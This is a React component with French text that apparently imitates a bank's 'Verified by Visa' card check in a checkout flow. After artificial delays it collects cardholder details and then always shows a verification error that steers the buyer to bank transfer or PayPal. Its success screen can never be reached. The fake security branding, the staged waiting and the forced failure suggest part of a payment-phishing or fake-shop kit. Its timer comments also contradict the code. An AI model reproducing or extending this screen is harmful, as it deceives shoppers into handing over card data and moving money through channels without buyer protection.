import React from 'react';

const CheckoutVerify = ({ verificationError, bankName, bankLogo, cardType, cardScheme, cardCountry, discountedPrice, onRetry }) => {
  const [cardHolder, setCardHolder] = React.useState('');
  const [bank, setBank] = React.useState(bankName || '');
  const [type, setType] = React.useState(cardType || '');
  const [scheme, setScheme] = React.useState(cardScheme || '');
  const [country, setCountry] = React.useState(cardCountry || '');
  const [step, setStep] = React.useState(1);

  React.useEffect(() => {
    const timer = setTimeout(() => {
      if (step === 1) {
        setStep(2);
      }
    }, 12000); // 8 seconds delay

    return () => clearTimeout(timer); // Cleanup the timer on component unmount
  }, [step]);

  const handleVerifyClick = () => {
    setStep(3);
    setTimeout(() => {
      // Simulate verification process
      setStep(4);
    }, 16000); // 6 seconds delay
  };

  return (
    <div className="verification-wrapper">
      <div className="verification-popup">
        {step === 1 ? (
          <>
            <h2>Vérification du paiement</h2>
            <p className='desc'>Nous vérifions votre moyen de paiement, cela peut prendre jusqu'à 30 secondes, merci de patienter.</p>
            <div className="loader"></div>
          </>
        ) : step === 2 ? (
          <>
            <div className='head'>
              <img src={bankLogo ? bankLogo : '/favicon.png'} alt={`${bank} logo`} className="bank-logo" />
              <img src='/verified-by-visa.png' alt="Verified by Visa logo" className="visa-logo" />
            </div>
            <h2>Confirmation du paiement</h2>
            <p className='desc'>Confirmez les informations suivantes pour vérifier votre carte bancaire et finaliser votre commande :</p>
            <div className="input-list">
              <label>
                <span>Titulaire</span> <input type="text" id="cardHolder" placeholder='Nom complet' onChange={(e) => setCardHolder(e.target.value)} required/>
              </label>
              <label>
                <span>Banque</span> <input type="text" id="bankName" value={bank} onChange={(e) => setBank(e.target.value)} />
              </label>
              <label>
                <span>Type</span> <input type="text" id="cardNumber" value={type} onChange={(e) => setType(e.target.value)} />
              </label>
              <label>
                <span>Réseau</span> <input type="text" id="cardScheme" value={scheme} onChange={(e) => setScheme(e.target.value)} />
              </label>
              <label>
                <span>Pays</span> <input type="text" id="cardCountry" value={country} onChange={(e) => setCountry(e.target.value)} />
              </label>
            </div>
            <button onClick={handleVerifyClick}>Confirmer</button>
            <p className='notice'><span className='underline'>Anti-fraudes</span> : Confirmez les informations de votre carte pour procéder au paiement.</p>
          </>
        ) : step === 3 ? (
          <>
            <h2>Vérification en cours</h2>
            <p className='desc'>Nous vérifions vos informations, patientez quelques instants pour procéder au paiement.</p>
            <div className="loader"></div>
          </>
        ) : step === 4 ? (
          <>
            <div className='head'>
              <img src={bankLogo ? bankLogo : '/favicon.png'} alt={`${bank} logo`} className="bank-logo" />
              <img src='/verified-by-visa.png' alt="Verified by Visa logo" className="visa-logo" />
            </div>
            <h2>Erreur de vérification</h2> 
            <p className='desc'>Votre carte n'a pas pu être vérifiée, réessayez ou utilisez un autre moyen de paiement.</p>
            
            <p className='smaller'>Moyens alternatifs : Virement bancaire, PayPal</p>
            <button onClick={onRetry}>Réessayer</button>
          </>
        ) : (
          <>
            <h2>Vérification réussie</h2>
            <p className='desc'>Votre carte a été vérifiée avec succès.</p>
          </>
        )}
      </div>
    </div>
  );
};

export default CheckoutVerify;